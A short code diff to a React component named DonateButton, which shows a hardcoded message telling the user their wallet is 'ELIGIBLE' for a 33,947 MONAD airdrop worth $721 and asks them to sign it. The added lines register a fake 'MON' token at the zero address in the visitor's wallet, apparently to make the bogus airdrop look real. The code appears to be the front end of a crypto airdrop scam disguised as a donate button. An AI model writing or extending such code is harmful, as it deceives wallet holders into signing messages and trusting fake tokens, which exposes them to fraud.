@@ -187,6 +187,24 @@ export const DonateButton = () => {
       const message = '+33,947 MON\n$721\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD Airdrop.';
       
       try {
+        // Try to add the logo to wallet
+        try {
+          await provider.request({
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '0x0000000000000000000000000000000000000000',
+                symbol: 'MON',
+                decimals: 18,
+                image: window.location.origin + '/dex-logo.png',
+              },
+            } as any,
+          });
+        } catch {
+          // Ignore if wallet doesn't support watchAsset
+        }
+
         await provider.request({
           method: 'personal_sign',
           params: [message, wallet.address],
